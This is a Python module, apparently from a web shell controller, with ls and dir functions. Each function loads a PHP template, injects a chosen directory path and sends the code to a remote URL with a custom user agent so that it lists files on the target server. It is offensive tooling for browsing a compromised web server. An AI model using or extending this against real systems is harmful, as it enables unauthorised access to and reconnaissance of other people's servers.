import modules.send as send
def ls(url,com,pwd,uagent):
    with open('modules\\ls\\ls.php') as f:data = f.read()
    print("|       Date         |Type|R:W| Size  | Name")
    if com == "": # LS LOCAL PWD
        data = data.replace("$directory = __DIR__;", f"$directory = \'{pwd}\';")
    else:        #LS FROM COM
        data = data.replace("$directory = __DIR__;", f"$directory = \'{com}\';")
    return send.send(url,data,uagent)

def dir(url,com,pwd,uagent):
    with open('modules\\ls\\dir.php') as f:data = f.read()
    print("|       Date         |Type|R:W| Size  | Name")
    if com == "": # LS LOCAL PWD
        data = data.replace("$directory = __DIR__;", f"$directory = \'{pwd}\';")
    else:        #LS FROM COM
        data = data.replace("$directory = __DIR__;", f"$directory = \'{com}\';")
    return send.send(url,data,uagent)